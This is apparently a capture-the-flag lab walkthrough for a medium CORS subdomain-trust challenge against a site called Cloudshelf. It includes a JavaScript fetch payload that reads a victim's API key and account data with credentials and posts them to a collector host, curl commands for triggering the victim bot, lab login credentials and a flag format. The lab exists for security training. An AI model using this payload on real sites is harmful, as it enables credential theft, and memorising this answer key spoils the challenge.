# CORS — SubdomainTrust · Cloudshelf (difficulty: medium)

`GET /api/secret` (login required) returns `{username, api_key, balance, files}`. Cloudshelf's policy is "every `*.target.lab` service shares our SSO, so every `*.target.lab` origin is trusted": any origin whose hostname is `target.lab` or ends with `.target.lab` is reflected into `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. Subdomain trust is only as strong as your ability to control a subdomain — and in this lab any `*.target.lab` host except victim/attacker/collector/mail routes to **your** exploit server (wildcard DNS), e.g. `http://evil.target.lab:8119`.

Intended path:
1. Log in at http://victim.target.lab:8119/ as `0xnhsec` / `vlh-tester-01` and read the trust note on the dashboard.
2. Realize you own a matching origin: pick any host like `evil.target.lab` — it resolves to your exploit-server vhost.
3. Confirm: `curl -si -b "sid=<sid>" -H "Origin: http://evil.target.lab:8119" http://victim.target.lab:8119/api/secret` → ACAO echoes your subdomain.
4. Store the artifact at `PUT http://evil.target.lab:8119/pages/exploit.html` (or via the attacker vhost form): `fetch('http://victim.target.lab:8119/api/secret',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://collector.target.lab:8119/collect',{method:'POST',body:d}))`.
5. Trigger the bot: `curl -X POST http://collector.target.lab:8119/victim -H 'Content-Type: application/json' -d '{"url":"http://victim.target.lab:8119/api/secret","origin":"http://evil.target.lab:8119","referer":"http://evil.target.lab:8119/pages/exploit.html"}'`
6. `curl http://collector.target.lab:8119/verify` → flag.

Flag: `DSLTV{CORS-SubdomainTrust-<9-10 digits>}` (event-verified — minted by the verifier, regenerated every restart).
